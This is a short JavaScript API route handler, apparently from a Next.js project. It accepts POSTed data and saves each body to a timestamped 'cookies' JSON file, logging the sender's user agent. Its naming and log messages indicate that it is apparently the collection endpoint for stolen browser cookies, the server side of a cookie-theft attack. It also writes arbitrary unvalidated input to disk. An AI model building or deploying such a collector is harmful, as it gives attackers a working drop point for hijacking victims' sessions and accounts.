export default function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const data = req.body;
      
      // Save to a file
      const fs = require('fs');
      const path = require('path');
      
      const filename = `cookies_${Date.now()}.json`;
      const filepath = path.join(process.cwd(), 'data', filename);
      
      // Ensure data directory exists
      if (!fs.existsSync(path.join(process.cwd(), 'data'))) {
        fs.mkdirSync(path.join(process.cwd(), 'data'));
      }
      
      fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
      
      console.log(`Collected data from ${data.userAgent}`);
      
      return res.status(200).json({ success: true });
    } catch (error) {
      console.error('Error collecting cookies:', error);
      return res.status(500).json({ success: false, error: 'Server error' });
    }
  } else {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }
}